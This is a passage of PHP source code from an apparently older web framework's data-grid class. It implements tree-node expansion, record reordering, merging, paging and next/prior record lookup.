          $list = explode('-', $event_value);
          $this->expand($list[0], $list[1], !$this->is_expanded($list[0], $list[1]));
          $this->submit_handled();
          return true;
          break;
        case "expand_tree":
          $list = explode('-', $event_value);
          $this->expand($list[0], $list[1], !$this->is_expanded($list[0], $list[1]), true);
          $this->submit_handled();
          return true;
          break;
        case "expand_all":
          global $db;
          $query = $db->query($this->sql);
          while($row = $db->next_row($query))
            $this->expand($row[$this->key_field], 0, true, true);
          $this->submit_handled();
          return true;
          break;
        case "collapse_all":
          global $db;
          $query = $db->query($this->sql);
          while($row = $db->next_row($query))
            $this->expand($row[$this->key_field], 0, false, true);
          $this->submit_handled();
          return true;
          break;
      }
    }
    
    if ($this->capable('change_order')) {
      global $db;
      
      switch ($event_name) {
        case "move_up":
          $this->check_current_order_duplicates($event_value);
          $curl = $db->row('SELECT * FROM '.$this->table.' WHERE '.$this->key_field.' = ?', $event_value);
          $prior_sql = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' < ?';
          if ($this->work_mode == 'tree')
            if ($curl[$this->parent_field])
              $prior_sql .= placeholder(' AND '.$this->parent_field.' = ?', $curl[$this->parent_field]);
            else  
              $prior_sql .= ' AND '.$this->parent_field.' IS NULL';
          $prior_sql .= ' ORDER BY '.$this->order_field.' DESC';
          $prior_url = $db->row($prior_sql, $curl[$this->order_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $prior_url[$this->order_field], $curl[$this->key_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $curl[$this->order_field], $prior_url[$this->key_field]);
          move_browser_record_pointer($this->table, $event_value);
          $this->submit_handled();
          break;
        case "move_down":
          $this->check_current_order_duplicates($event_value);
          $curl = $db->row('SELECT * FROM '.$this->table.' WHERE id = ?', $event_value);
          $next_sql = 'SELECT * FROM '.$this->table.' WHERE '.$this->order_field.' > ?';;
          if ($this->work_mode == 'tree')
            if ($curl[$this->parent_field])
              $next_sql .= placeholder(' AND '.$this->parent_field.' = ?', $curl[$this->parent_field]);
            else  
              $next_sql .= ' AND '.$this->parent_field.' IS NULL';
          $next_sql .= ' ORDER BY '.$this->order_field;
          $next_url = $db->row($next_sql, $curl[$this->order_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $next_url[$this->order_field], $curl[$this->key_field]);
          $db->query('UPDATE '.$this->table.' SET '.$this->order_field.' = ? WHERE '.$this->key_field.' = ?', $curl[$this->order_field], $next_url[$this->key_field]);
          move_browser_record_pointer($this->table, $event_value);
          $this->submit_handled();
          break;
      }
    }
    
    if ($this->capable('merge')) {
      global $db;
      switch ($event_name) {
        case "merge":
          if ($target_name = $this->context_post('reason_value')) {
            if (count($this->selection()) > 1) {
              $selection = $this->do_before_merge($this->selection());
              $ids = array();
              $object_id = null;
              foreach($selection as $key) {
                if (!$object_id)
                  $object_id = $key;
                else  
                  $ids[] = $key;
              }
              if ($object_id) {
                $this->do_merge($object_id, $target_name, $ids);
              } else
                $this->set_setting('alert_from_prior_session', 'Can not merge selected enumerations');
            } else
              $this->set_setting('alert_from_prior_session', 'Please select at least two records for merging');
          } else
            $this->set_setting('alert_from_prior_session', 'You did not entered name for target record');
          $this->submit_handled();
          break;
      }
    }  

    return $result;
    
  }

  function order($name) {

    $browser_configuration = $this->browser_configuration();
    return $browser_configuration->get_order($name);

  }

  function order_exists($name) {

    $browser_configuration = $this->browser_configuration();
    $order = $browser_configuration->get_all_orders();
    return isset($order[$name]);

  }

  function clear_order($name) {

    if ($name)
      $this->set_order($name, ''); 

  }

  function get_next_record_id($id) {

    return $this->get_record_id($id, 'next');

  }

  function get_prior_record_id($id) {

    return $this->get_record_id($id, 'prior');

  }

  function get_any_record_id($id) {

    return $this->get_record_id($id, 'any');

  }
  
  function get_record_id($id, $scope = 'any') {

    global $url;
    global $db;

    $sql = $this->get_prepared_sql($this->sql());
    if (!$this->hide_pager) {
      $this->pager = new pager($sql, $url->page_no($this->pager_param), $this->items_per_page, $this->pager_length);
      $this->pager->pager_param = $this->pager_param;
      $this->pager->calc_totals = !$this->large_table;
      $sql = $this->pager->calculate(1);
    }
    $query = $db->query($sql);
    $result = null;
    $first = null;
    $prior = null;
    $found = false;
    while ($row = $db->next_row($query)) {
      if (!$first and ($row[$this->key_field] != $id))
        $first = $row[$this->key_field];
      if (($scope == 'any') and ($row[$this->key_field] != $id)) {
        $result = $row[$this->key_field];
        break;
      }
      if (($scope == 'next') and $found) {
        $result = $row[$this->key_field];
        break;
      }
      if ($row[$this->key_field] == $id) {
        $found = true;
        if ($scope == 'prior') {
          $result = $prior;
          break;
        }
      }
      $prior = $row[$this->key_field];
    }
    if (!$result)
      $result = $first;
    return $result;

  }

  function prepare_data() {

    global $db;
    
    if ($this->sql = $this->get_prepared_sql($this->sql())) {
      
      if ($this->visible('pager')) {
        $this->pager = new sql_pager($this->sql);
        $this->pager->page_size       = ($this->is_print_mode()?9999999:$this->page_size);
        $this->pager->pager_length    = $this->pager_length;
        $this->pager->page_param      = $this->url_param_name('page_number');
        $this->pager->page_size_param = $this->url_param_name('page_size');
        $this->pager->calc_totals     = !$this->large_table;
        $this->pager->items_limit   = $this->items_limit;
        
        if ($this->manual_items_limit) {
          $this->pager->calculate(); 
        } else {
          $this->sql = $this->pager->calculate(); 
        }
      }

      $proceed = true;
                     
      if (!$this->visible('empty_body')) {
        if ($this->visible('pager'))
          $proceed = $this->pager->items_amount > 0;
        else {
          $row = $db->row($this->sql);
          $proceed = $row;
        }
      }
      
      if (!$proceed) {
        $proceed = $this->do_get_first_row();
      }
        
      return $proceed;
      
    } else {
    
      return false;
    
    }
      
  }
  
  function finalyze_title($row) {


  }
  
  function finalyze_conclusion($row) {

    if ($this->visible('pager') and ($this->pager->items_amount > 0) and !$this->is_print_mode()) {
      if ($this->visible('pager_info')) {
        $cell = new table_cell(array("class" => "pager_info"));
        $this->pager->render_pager_info(&$cell);
        $row->add($cell);
      }
      if ($this->visible('pager')) {
        $cell = new table_cell(array("class" => "pager"));
        $this->pager->render_pager(&$cell);
        $row->add($cell);
      }
    }
    
  }

  function get_prepared_sql($sql) {

    return $this->apply_order(parent::get_prepared_sql($sql));

  }
  
  // tree mode
  
  function do_after_setup() {
    
    if ($this->work_mode == 'tree') {

      $this->persistent_record_pointer = $this->binded;
      
      if (!$this->root_sql) {
        $this->root_sql = "SELECT *
                             FROM ".$this->table."
                            WHERE CASE WHEN ".$this->parent_field." IS NULL THEN 0 ELSE ".$this->parent_field." END = 0
                                  /*filter*/";
        if ($this->capable('change_order'))
          $this->root_sql .= " ORDER BY ".$this->order_field;
        else
          $this->root_sql .= " ORDER BY ".$this->name_field;
      }
      
      if (!$this->sub_sql) { 
        $this->sub_sql = "SELECT *
                            FROM ".$this->table."
                           WHERE ".$this->parent_field." = ?
                                 /*filter*/";
        if ($this->capable('change_order'))
          $this->sub_sql .= " ORDER BY ".$this->order_field;
        else
          $this->sub_sql .= " ORDER BY ".$this->name_field;
      }

      global $dm;
      if ($this->auto_remove_childs)
        $dm->delete_details($this->table, $this->table, array('key_field' => $this->key_field, 'foreign_key_field' => $this->parent_field));
      else  
        $dm->protect_details($this->table, $this->table, array('key_field' => $this->key_field, 'foreign_key_field' => $this->parent_field));
                            
      $this->sql = $this->root_sql;
      
      $this->tree_level = 0;

      $this->node_state_storage = TREE_BROWSER_NODE_STATE_STORAGE.__HTML_CONTROL_NAME_SEPARATOR.get_class($this);
      
    }
    
    parent::do_after_setup();

  }
  
  function is_expanded($id, $level) {
    
    $storage = session_get($this->node_state_storage);
    return safe($storage, $id.'-'.$level);
        
  }

  function is_something_expanded() {
    
    $storage = session_get($this->node_state_storage);
    if ($storage)
      foreach($storage as $key => $value)
        if ($value)
          return true;
    return false;
        
  }

  function expand($id, $level, $expand, $whole_tree = false) {

    move_browser_record_pointer($this->table, $id);
    $storage = session_get($this->node_state_storage);
    $storage[$id.'-'.$level] = $expand; 
    if ($whole_tree) {
      global $dm, $db;
      $childs = $dm->select_childs($this->table, $id, $level);
      $childs = $db->query($childs);
      while ($child = $db->next_row($childs))
        $storage[$child['id'].'-'.($child['level']-1)] = $expand; 
    }
    session_set($this->node_state_storage, $storage);
    
  }

  function render_tree_column($cell, $row, $name) {

    if ($this->work_mode == 'tree') {

      global $ui, $db, $dm, $auth;
                      
      switch ($name) {
        case $this->hierarchy_column:
          $sql = placeholder($this->sub_sql, $row[$this->key_field]);

          if ($cell->text) {
            $cell->insert(new text($cell->text));
            $cell->text = '';
          }

          $childs_amount = $db->count($sql);
          if ($childs_amount > 0) {
            if ($this->expand_icon && $dm->is_nested_set($this->table)) {
              $cell->insert(new space(2));
              $cell->insert(new javascript_image_href( $this->js_post_back("expand_tree", $row["id"].'-'.$this->tree_level)
                                                     , SHARED_RESOURCES_URL.($this->is_expanded($row["id"], $this->tree_level)?"img_collapse_tree".($this->expand_icon?'_'.$this->expand_icon:''):"img_expand_tree".($this->expand_icon?'_'.$this->expand_icon:'')).".gif"
                                                     , array('title' => ($this->is_expanded($row["id"], $this->tree_level)?'Collapse':'Expand').' whole node')
                                                     ));
            }
            $cell->insert(new space(2));
            $cell->insert(new javascript_image_href( $this->js_post_back("expand", $row["id"].'-'.$this->tree_level)
                                                   , SHARED_RESOURCES_URL.($this->is_expanded($row["id"], $this->tree_level)?"img_collapse":"img_expand").".gif"
                                                   ));

          } 

          $cell->insert(new space($this->tree_level*9));
          
          if ($childs_amount && !$this->expand_icon) {
            $cell->add(new html_br());
            $cell->add(new space($this->tree_level*9));
            $cell->add(new javascript_image_href( $this->js_post_back("expand_tree", $row["id"].'-'.$this->tree_level)
                                                , SHARED_RESOURCES_URL.($this->is_expanded($row["id"], $this->tree_level)?"img_collapse_tree":"img_expand_tree").".gif"
                                                ));
          }
          break;
      }
    }

  }

  function render_tree_nodes($grid_table, $row) { 

    if ($this->work_mode == 'tree') {
      global $auth;
      
      if ($this->is_expanded($row["id"], $this->tree_level)) {
        $this->tree_level++;

        $sql = $this->get_prepared_sql(placeholder($this->sub_sql, $row[$this->key_field]));
        
        $this->render_grid_by_sql(&$grid_table, $sql);
        $this->tree_level--;
      }
    }
    
  }
  
  function do_merge($object_id, $new_name, $ids) {
  
    return false;
     
  }
  
  function do_before_merge($selection) {
  
    return $selection;
     
  }

}

function move_browser_record_pointer($table, $key = null) {
 
  session_set($table.__HTML_CONTROL_NAME_SEPARATOR.'edited_key', $key);
  
}

function get_browser_record_pointer($table) {
 
  return session_get($table.__HTML_CONTROL_NAME_SEPARATOR.'edited_key');
  
}
  

?>
